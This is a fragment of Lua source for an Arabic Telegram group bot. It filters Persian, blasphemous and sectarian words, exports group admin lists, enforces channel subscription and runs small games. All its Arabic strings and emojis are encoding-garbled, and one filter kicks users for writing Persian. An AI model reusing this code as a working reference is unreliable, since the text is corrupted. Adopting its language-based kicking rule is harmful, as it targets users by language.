DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","โ๏ธููููุน ุงูุชููู ุจุงูุบู ุงููุงุฑุณูู ููุง")  
end end
if text and (text:match("ฺฌ") or text:match("ูบ") or text:match("ฺ") or text:match("ฺ") or text:match("ฺฟ") or text:match("ฺ") or text:match("ฺ") or text:match("?ซ") or text:match("ฺ") or text:match("ฺ") or text:match("?") or text:match("ฺธ") or text:match("ูพ") or text:match("?ด") or text:match("ูฺฉ") or text:match("ุฒุฏู") or text:match("ุฏุฎุชุฑุง") or text:match("ุฏ?ูุซ") or text:match("ฺฉู?ูพุดู") or text:match("ุฎูุดุดูู") or text:match("ู?ุฏุง") or text:match("ฺฉู") or text:match("ุจุฏุงู?ู") or text:match("ุจุง?ุฏ") or text:match("ุฒูุงุดู??") or text:match("ุขููุฒุด") or text:match("ุฑุงุญุช?") or text:match("ุฎุณุชู") or text:match("ุจ?ุงู") or text:match("ุจูพูุดู") or text:match("ูุฑูู")) then
if Devmfm:get(mustafa.."mfm:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("ุฎุฑู ุจุงููู") or text:match("ุฎุจุฑุจู") or text:match("ูุณุฏููุฑุจู") or text:match("ุฎุฑุจ ุจุงููู") or text:match("ุฎุฑุจ ุงููู") or text:match("ุฎุฑู ุจุฑุจู") or text:match("ุงููู ุงูููุงุฏ") or text:match("ุฎุฑู ุจูุญูุฏ") or text:match("ูุณู ุงููู") or text:match("ูุณู ุฑุจู") or text:match("ูุณุฑุจู") or text:match("ูุณุฎุชุงููู") or text:match("ูุณุฎุช ุงููู") or text:match("ุฎุฑู ุจุฏููู") or text:match("ุฎุฑูุจุฏููู") or text:match("ูุณุงููู") or text:match("ุฎุฑุจุงููู")) then
if not Devmfm:get(mustafa.."mfm:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","โ๏ธููููุน ุงูููุฑ ูู ุงููุฌููุนู") 
end end
if text and (text:match("ุณูู ููุณ") or text:match("ุดูุนู") or text:match("ุงูุดูุนู") or text:match("ุงูุณูู") or text:match("ุทุงุฆูุชูู") or text:match("ุดูุนู") or text:match("ุงูุง ุณูู") or text:match("ูุณูุญู") or text:match("ูููุฏู") or text:match("ูุฑุฏู") or text:match("ููุญุฏ") or text:match("ุจุงูุณูู") or text:match("ุดูุนุฉ")) then
if not Devmfm:get(mustafa.."mfm:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","โ๏ธููููุน ุงูุชููู ุจุงูุทุงุฆููู ููุง") 
end end
if SecondSudo(msg) then
if text == 'ุฌูุจ ูุณุฎู ุงููุฑูุจุงุช' and ChCheck(msg) or text == 'ุฌูุจ ูุณุฎู ุงุญุชูุงุทูู' and ChCheck(msg) then
local List = Devmfm:smembers(mustafa..'mfm:Groups') 
local BotName = (Devmfm:get(mustafa.."mfm:NameBot") or 'ุงูุดูุทุงู')
local GetJson = '{"BotId": '..mustafa..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
LinkGroups = Devmfm:get(mustafa.."mfm:Groups:Links"..v)
Welcomes = Devmfm:get(mustafa..'mfm:Groups:Welcomes'..v) or ''
mfmConstructors = Devmfm:smembers(mustafa..'mfm:mfmConstructor:'..v)
Constructors = Devmfm:smembers(mustafa..'mfm:BasicConstructor:'..v)
BasicConstructors = Devmfm:smembers(mustafa..'mfm:Constructor:'..v)
Managers = Devmfm:smembers(mustafa..'mfm:Managers:'..v)
Admis = Devmfm:smembers(mustafa..'mfm:Admins:'..v)
Vips = Devmfm:smembers(mustafa..'mfm:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
end
if #Vips ~= 0 then 
GetJson = GetJson..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Admis ~= 0 then
GetJson = GetJson..'"Admis":['
for k,v in pairs(Admis) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Managers ~= 0 then
GetJson = GetJson..'"Managers":['
for k,v in pairs(Managers) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Constructors ~= 0 then
GetJson = GetJson..'"Constructors":['
for k,v in pairs(Constructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #BasicConstructors ~= 0 then
GetJson = GetJson..'"BasicConstructors":['
for k,v in pairs(BasicConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #mfmConstructors ~= 0 then
GetJson = GetJson..'"mfmConstructors":['
for k,v in pairs(mfmConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if LinkGroups then
GetJson = GetJson..'"LinkGroups":"'..LinkGroups..'",'
end
GetJson = GetJson..'"Welcomes":"'..Welcomes..'"}'
end
GetJson = GetJson..'}}'
local File = io.open('./'..mustafa..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..mustafa..'.json', 'โ๏ธูุญุชูู ุงูููู ุนูู โซ '..#List..' ูุฌููุนู',dl_cb, nil)
io.popen('rm -rf ./'..mustafa..'.json')
end
if text == 'ุฑูุน ุงููุณุฎู' and tonumber(msg.reply_to_message_id_) > 0 or text == 'ุฑูุน ุงููุณุฎู ุงูุงุญุชูุงุทูู' and tonumber(msg.reply_to_message_id_) > 0 then   
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if Devmfm:get(mustafa.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_mfm( msg.chat_id_, msg.id_, 1,"โ๏ธููุฌุฏ ููุท ( 6 ) ุงุฎุชูุงุฑุงุช\nโ๏ธุงุฑุณู ุงุฎุชูุงุฑู ูุฑู ุงุฎุฑู", 1, "md")    
return false  end 
local GETNUM = Devmfm:get(mustafa.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
Devmfm:del(mustafa.."SET:GAME"..msg.chat_id_)   
Dev_mfm( msg.chat_id_, msg.id_, 1,'โ๏ธ*ุงููุญูุจุณ ุจุงููุฏ ุฑูู* โซ '..NUM..'\nโ๏ธ*ูุจุฑูู ููุฏ ุฑุจุญุช ูุญุตูุช ุนูู 5 ููุงุท ููููู ุงุณุชุจุฏุงููุง ุจุงูุฑุณุงุฆู*', 1, "md") 
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
Devmfm:del(mustafa.."SET:GAME"..msg.chat_id_)   
Dev_mfm( msg.chat_id_, msg.id_, 1,'โ๏ธ*ุงููุญูุจุณ ุจุงููุฏ ุฑูู* โซ '..GETNUM..'\nโ๏ธ*ููุงุณู ููุฏ ุฎุณุฑุช ุญุงูู ูุฑู ุงุฎุฑู ููุนุซูุฑ ุนูู ุงููุญูุจุณ*', 1, "md")
end
end
end
if Devmfm:get(mustafa..'Devmfm4'..msg.sender_user_id_) then
if text and text:match("^ุงูุบุงุก$") then 
send(msg.chat_id_, msg.id_, "โ๏ธุชู ุงูุบุงุก ุงูุงูุฑ")
Devmfm:del(mustafa..'Devmfm4'..msg.sender_user_id_)
return false  end 
Devmfm:del(mustafa..'Devmfm4'..msg.sender_user_id_)
local username = string.match(text, "@[%a%d_]+") 
tdcli_function({ID = "SearchPublicChat",username_ = username},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, 'โ๏ธุงููุนุฑู ูุง ููุฌุฏ ููู ููุงุฉ')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, 'โ๏ธุนุฐุฑุง ูุง ููููู ูุถุน ูุนุฑู ุญุณุงุจุงุช ูู ุงูุงุดุชุฑุงู')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_, 'โ๏ธุนุฐุฑุง ูุง ููููู ูุถุน ูุนุฑู ูุฌููุนู ูู ุงูุงุดุชุฑุงู')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,'โ๏ธุงูุจูุช ุงุฏูู ูู ุงูููุงุฉ \nโ๏ธุชู ุชูุนูู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู \nโ๏ธุงูุฏู ุงูููุงุฉ โซ '..data.id_..'\nโ๏ธูุนุฑู ุงูููุงุฉ โซ [@'..data.type_.channel_.username_..']')
Devmfm:set(mustafa..'Devmfm2',data.id_)
Devmfm:set(mustafa..'Devmfm3','@'..data.type_.channel_.username_)
else
send(msg.chat_id_, msg.id_,'โ๏ธุนุฐุฑุง ุงูุจูุช ููุณ ุงุฏูู ูู ุงูููุงุฉ')
end
return false  
end
end,nil)
end
if Devmfm:get(mustafa.."mfm:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then
if text and text:match("^ุงูุบุงุก$") then 
Devmfm:del(mustafa.."mfm:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุงูุงูุฑ', 1, 'md')
return false 
end 
Devmfm:del(mustafa.."mfm:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
Devmfm:set(mustafa.."DevText", DevText)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญูุธ ูููุดุฉ ุงููุทูุฑ", 1, "md")
end
if Devmfm:get(mustafa..'mfm:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^ุงูุบุงุก$") then 
Devmfm:del(mustafa..'mfm:NameBot'..msg.sender_user_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุงูุงูุฑ', 1, 'md')
return false 
end 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุญูุธ ุงุณู ุงูุจูุช ', 1, 'html')
Devmfm:del(mustafa..'mfm:NameBot'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:NameBot', text)
return false 
end
if text == "ุงูุฑุงุจุท" then
if not Devmfm:get(mustafa.."mfm:Lock:GpLinks"..msg.chat_id_) then 
if Devmfm:get(mustafa.."mfm:Groups:Links"..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ๐๐๐๐๐ ๐ณ๐๐๐ โฌ โค \nโ โ โ โ โ โ โ โ โ\n"..Devmfm:get(mustafa.."mfm:Groups:Links"..msg.chat_id_), 1, "html")
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุงููุฌุฏ ุฑุงุจุท ุงุฑุณู โซ ุถุน ุฑุงุจุท ุงู ุงุฑุณู โซ ุงูุดุงุก ุฑุงุจุท ููุงูุดุงุก', 1, 'md')
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุฌูุจ ุฑุงุจุท ุงููุฌููุนู ูุนุทู', 1, 'md')
end
end
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'ุจูุช' or text == 'ุจูุชุช' then 
NameBot = (Devmfm:get(mustafa..'mfm:NameBot') or 'ุงูุดูุทุงู')
local mustafaTEAM = {"ูุชููู ุจูุช ุงุณูู "..NameBot.." ๐๐ช","ุงุณูู ุงููููู "..NameBot.." ๐โฅ๏ธ","ุนูุฏู ุงุณู ุชุฑู ๐๐","ุตูุญููู "..NameBot.." ูุงูู ุจูุช ๐๐ช","ุงูุช ุงูุจูุช ูู ๐๐"} 
Devmfm2 = math.random(#mustafaTEAM) 
Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM[Devmfm2] , 1, 'html') 
return false
end
if text == 'ุงุณู ุงูุจูุช' or text == 'ุงูุจูุช ุดูู ุงุณูู' or text == 'ุดุณูู ุงูุจูุช' or text == 'ุงูุจูุช ุดุณูู' then
NameBot = (Devmfm:get(mustafa..'mfm:NameBot') or 'ุงูุดูุทุงู') 
local mustafaTEAM = {"ุงุณูู ุงููููู "..NameBot.." ๐โฅ๏ธ","ููุงุง ูุฑูุญูู ููุงูู "..NameBot.." ๐ปโฅ๏ธ"} 
Devmfm2 = math.random(#mustafaTEAM) 
Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM[Devmfm2] , 1, 'html') 
return false
end
if text and text == (Devmfm:get(mustafa..'mfm:NameBot') or 'ุงูุดูุทุงู') then 
NameBot = (Devmfm:get(mustafa..'mfm:NameBot') or 'ุงูุดูุทุงู')
local namebot = {'๐ธโฅ๏ธ ููุง ููุจู ููุงู '..NameBot..' ุชูุถู','ุชุฑุฉู ูุตุฎุชูุงุง ุงุญุฌูู ุดุฑุงูุฏ ๐๐๐','ุงุทููู ูุงุญุฏุฏ ูุตูุญ '..NameBot..' ๐ปโฅ๏ธ','ุฎุจุตุชุช ุงููุฉุฉ ุดุชุฑูุฏุฏ ุนุงุงุฏ ๐คง๐๐'} 
name = math.random(#namebot) 
Dev_mfm(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'html') 
return false 
end
if text =='ููุงุทู' and ChCheck(msg) then 
if tonumber((Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธูู ุชุฑุจุญ ุงู ููุทู\nโ๏ธุงุฑุณู โซ ุงูุงูุนุงุจ ููุนุจ', 1, 'md')
else 
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธุนุฏุฏ ุงูููุงุท ุงูุชู ุฑุจุญุชูุง โซ '..(Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'ุญุฐู ุฑุณุงุฆูู' and ChCheck(msg) or text ==  'ูุณุญ ุฑุณุงุฆูู' and ChCheck(msg) then Devmfm:del(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุญุฐู ุฌููุน ุฑุณุงุฆูู', 1, 'md') end
if text ==  'ุญุฐู ููุงุทู' and ChCheck(msg) or text ==  'ูุณุญ ููุงุทู' and ChCheck(msg) then Devmfm:del(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุญุฐู ุฌููุน ููุงุทู', 1, 'md') end
if text == 'ุณูุงููุงุช' and ChCheck(msg) or text == 'ุงูุณูุงููุงุช' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'๐','๐','๐','๐','๐','๐','๐','๐','๐','๐','๐','๐','๐','๐ฅฅ','๐ฅ','๐','๐','๐ฅ','๐ฅฆ','๐ฅ','๐ถ','๐ฝ','๐ฅ','๐ฅ','๐?','๐ฅ','๐','๐ฅ','๐ฅจ','๐ง','๐ฅ','๐ณ','๐ฅ','๐ฅ','๐ฅฉ','๐','๐','๐ญ','๐','๐','๐','๐ฅช','๐ฅ','๐ผ','โ๏ธ','๐ต','๐ฅค','๐ถ','๐บ','๐ป','๐','โฝ๏ธ','๐','โพ๏ธ','๐พ','๐','๐','๐ฑ','๐','๐ธ','๐ฅ','๐ฐ','๐ฎ','๐ณ','๐ฏ','๐','๐ป','๐ธ','๐บ','๐ฅ','๐น','๐ผ','๐ง','๐ค','๐ฌ','๐จ','๐ญ','๐ช','๐','๐ค','๐','๐ต','๐','๐','๐ฅ','๐ท','๐','๐','๐','๐','๐','๐','๐','๐','๐','๐','๐','๐ฎ๐ถ','โ๏ธ','๐ก','๐ฎ','๐ก','๐ฃ','โฑ','๐ข','๐','๐','๐','๐','๐ช','๐ซ','๐ฌ','๐ญ','โฐ','๐บ','๐','โ๏ธ','๐ก'}
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ฅจ','๐ฅจ')
name = string.gsub(name,'๐ง','๐ง')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ณ','๐ณ')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ฅฉ','๐ฅฉ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ญ','๐ญ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ฅช','๐ฅช')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ผ','๐ผ')
name = string.gsub(name,'โ๏ธ','โ๏ธ')
name = string.gsub(name,'๐ต','๐ต')
name = string.gsub(name,'๐ฅค','๐ฅค')
name = string.gsub(name,'๐ถ','๐ถ')
name = string.gsub(name,'๐บ','๐บ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ฅฅ','๐ฅฅ')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ฅฆ','๐ฅฆ')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ถ','๐ถ')
name = string.gsub(name,'๐ฝ','๐ฝ')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐?','๐?')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ป','๐ป')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'โฝ๏ธ','โฝ๏ธ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'โพ๏ธ','โพ๏ธ')
name = string.gsub(name,'๐พ','๐พ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ฑ','๐ฑ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ธ','๐ธ')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ฐ','๐ฐ')
name = string.gsub(name,'๐ฎ','๐ฎ')
name = string.gsub(name,'๐ณ','๐ณ')
name = string.gsub(name,'๐ฏ','๐ฏ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ป','๐ป')
name = string.gsub(name,'๐ธ','๐ธ')
name = string.gsub(name,'๐บ','๐บ')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐น','๐น')
name = string.gsub(name,'๐ผ','๐ผ')
name = string.gsub(name,'๐ง','๐ง')
name = string.gsub(name,'๐ค','๐ค')
name = string.gsub(name,'๐ฌ','๐ฌ')
name = string.gsub(name,'๐จ','๐จ')
name = string.gsub(name,'๐ญ','๐ญ')
name = string.gsub(name,'๐ช','๐ช')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ค','๐ค')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ต','๐ต')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ท','๐ท')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ฎ๐ถ','๐ฎ๐ถ')
name = string.gsub(name,'โ๏ธ','โ๏ธ')
name = string.gsub(name,'๐ก','๐ก')
name = string.gsub(name,'๐ฎ','๐ฎ')
name = string.gsub(name,'๐ก','๐ก')
name = string.gsub(name,'๐ฃ','๐ฃ')
name = string.gsub(name,'โฑ','โฑ')
name = string.gsub(name,'๐ข','๐ข')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ช','๐ช')
name = string.gsub(name,'๐ซ','๐ซ')
name = string.gsub(name,'๐ฌ','๐ฌ')
name = string.gsub(name,'๐ญ','๐ญ')
name = string.gsub(name,'โฐ','โฐ')
name = string.gsub(name,'๐บ','๐บ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'โ๏ธ','โ๏ธ')
mustafaTEAM = 'โ๏ธุงูู ูุงุญุฏ ูุฏุฒ ูุฐุง ุงูุณูุงูู ูุฑุจุญ โซ '..name
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum'..msg.chat_id_) and not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
mustafaTEAM = 'โ๏ธูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธุงุฑุณู โซ ุณูุงููุงุช ููุนุจ ูุฑู ุงุฎุฑู'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end
if text == 'ุชุฑุชูุจ' and ChCheck(msg) or text == 'ุงูุชุฑุชูุจ' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'ุณุญูุฑ','ุณูุงุฑู','ุงุณุชูุจุงู','ูููู','ุงูููู','ุจุฒููู','ูุทุจุฎ','ูุฑุณุชูุงูู','ุฏุฌุงุฌู','ูุฏุฑุณู','ุงููุงู','ุบุฑูู','ุซูุงุฌู','ูููู','ุณูููู','ุงูุนุฑุงู','ูุญุทู','ุทูุงุฑู','ุฑุงุฏุงุฑ','ููุฒู','ูุณุชุดูู','ููุฑุจุงุก','ุชูุงุญู','ุงุฎุทุจูุท','ุณูููู','ูุฑูุณุง','ุจุฑุชูุงูู','ุชูุงุญ','ูุทุฑูู','ุจุชูุชู','ููุงูู','ุดุจุงู','ุจุงุต','ุณููู','ุฐุจุงุจ','ุชููุงุฒ','ุญุงุณูุจ','ุงูุชุฑููุช','ุณุงุญู','ุฌุณุฑ'};
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ุณุญูุฑ','ุณ ุฑ ู ุญ')
name = string.gsub(name,'ุณูุงุฑู','ู ุฑ ุณ ู ุง')
name = string.gsub(name,'ุงุณุชูุจุงู','ู ุจ ุง ุช ู ุณ ุง')
name = string.gsub(name,'ูููู','ู ู ู ู')
name = string.gsub(name,'ุงูููู','ู ู ู ุง')
name = string.gsub(name,'ุจุฒููู','ุฒ ู ู ู')
name = string.gsub(name,'ูุทุจุฎ','ุฎ ุจ ุท ู')
name = string.gsub(name,'ูุฑุณุชูุงูู','ุณ ุช ุง ู ู ู ุฑ ู')
name = string.gsub(name,'ุฏุฌุงุฌู','ุฌ ุฌ ุง ุฏ ู')
name = string.gsub(name,'ูุฏุฑุณู','ู ู ุฏ ุฑ ุณ')
name = string.gsub(name,'ุงููุงู','ู ุง ู ุง ู')
name = string.gsub(name,'ุบุฑูู','ุบ ู ุฑ ู')
name = string.gsub(name,'ุซูุงุฌู','ุฌ ู ุช ู ุง')
name = string.gsub(name,'ูููู','ู ู ู ู')
name = string.gsub(name,'ุณูููู','ู ู ู ู ุณ')
name = string.gsub(name,'ุงูุนุฑุงู','ู ุน ุง ู ุฑ ุง')
name = string.gsub(name,'ูุญุทู','ู ุท ู ุญ')
name = string.gsub(name,'ุทูุงุฑู','ุฑ ุง ุท ู ู')
name = string.gsub(name,'ุฑุงุฏุงุฑ','ุฑ ุง ุฑ ุง ุฏ')
name = string.gsub(name,'ููุฒู','ู ุฒ ู ู')
name = string.gsub(name,'ูุณุชุดูู','ู ุด ุณ ู ุช ู')
name = string.gsub(name,'ููุฑุจุงุก','ุฑ ุจ ู ู ุง ุก')
name = string.gsub(name,'ุชูุงุญู','ุญ ู ุง ุช ู')
name = string.gsub(name,'ุงุฎุทุจูุท','ุท ุจ ู ุง ุฎ ุท')
name = string.gsub(name,'ุณูููู','ู ู ู ู ุณ')
name = string.gsub(name,'ูุฑูุณุง','ู ู ุฑ ุณ ุง')
name = string.gsub(name,'ุจุฑุชูุงูู','ุฑ ุช ู ุจ ุง ู ู')
name = string.gsub(name,'ุชูุงุญ','ุญ ู ุง ุช')
name = string.gsub(name,'ูุทุฑูู','ู ุท ู ุฑ ู')
name = string.gsub(name,'ุจุชูุชู','ุจ ุช ุช ู ู')
name = string.gsub(name,'ููุงูู','ู ู ู ู ู')
name = string.gsub(name,'ุดุจุงู','ุจ ุด ุง ู')
name = string.gsub(name,'ุจุงุต','ุต ุง ุจ')
name = string.gsub(name,'ุณููู','ู ุณ ู ู')
name = string.gsub(name,'ุฐุจุงุจ','ุจ ุง ุจ ุฐ')
name = string.gsub(name,'ุชููุงุฒ','ุช ู ู ุฒ ุง')
name = string.gsub(name,'ุญุงุณูุจ','ุณ ุง ุญ ู ุจ')
name = string.gsub(name,'ุงูุชุฑููุช','ุง ุช ู ุฑ ู ู ุช')
name = string.gsub(name,'ุณุงุญู','ุญ ุง ู ุณ')
name = string.gsub(name,'ุฌุณุฑ','ุฑ ุฌ ุณ')
mustafaTEAM = 'โ๏ธุงูู ูุงุญุฏ ูุฑุชุจูุง ูุฑุจุญ โซ '..name
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum'..msg.chat_id_) and not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
mustafaTEAM = 'โ๏ธูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธุงุฑุณู โซ ุชุฑุชูุจ ููุนุจ ูุฑู ุงุฎุฑู'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end
if text == 'ูุญูุจุณ' and ChCheck(msg) or text == 'ุจุงุช' and ChCheck(msg) or text == 'ุงููุญูุจุณ' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
Devmfm:set(mustafa.."GAMES"..msg.chat_id_,Num) 
TEST = [[
โ     โ     โ     โ     โ     โ
โ     โ     โ     โ     โ     โ
๐ โนโบ ๐๐ป โนโบ ๐๐ผ โนโบ ๐๐ฝ โนโบ ๐๐พ โนโบ ๐๐ฟ

โ๏ธุงุฎุชุฑ ุฑูู ูุงุณุชุฎุฑุงุฌ ุงููุญูุจุณ
โ๏ธุงููุงุฆุฒ ูุญุตู ุนูู (5) ููุงุท
]]
Dev_mfm(msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
